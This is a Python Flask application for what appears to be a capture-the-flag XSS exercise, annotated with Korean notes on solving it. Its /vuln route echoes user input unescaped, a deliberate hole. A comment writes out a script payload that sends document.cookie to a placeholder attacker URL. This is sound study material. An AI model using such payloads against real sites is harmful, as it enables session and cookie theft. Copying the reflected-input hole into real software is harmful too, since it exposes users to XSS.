#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"



def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param


# /flag 전달된 URL에 임의 이용자가 접속하게끔 합니다. 해당 이용자의 쿠키에는 FLAG가 존재합니다.
# 우린 이 임의 이용자의 cookie를 가져오려고 합니다.
# 따라서 임의 이용자가 접속했을 때 cookie를 내 memo로 가져올 생각입니다.
# 그럼 임의 이용자가 URL에 접속했을 때 자연스럽게 코드가 실행 되겠죠?
# 왜? vuln을 실행하니깐 vuln 페이지는 그냥 param을 retun, 즉 js면 실행해버려요.
# 상대방이 내 링크에 접속했을 때 /vuln?param=<script>location.href="http://myhacklink?memo=" + document.cookie</script>
# 상대방이 링크 접속 시 내 페이지로 상대방의 cookie를 보냄

# 만약 /flag라는 게시물 생성 페이지가 있을 때 해당 페이지는 뒤에 들어오는 스크립트를 그대로 실행시키는 xss 취약점이 있는 사이트다.
# 따라서 여기서 특정 게시물을 생성했을 때 해당 사이트는 xss 취약점이 있기에 임의의 이용자는 해당 게시물의 링크로 요청을 보내는 상황이 생길 수 있고
# 요청을 보내면 cookie가 따라가기 때문에 자연스럽게 피싱 사이트("http://myhacklink?memo=")로 쿠키를 전달하게 된다.

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
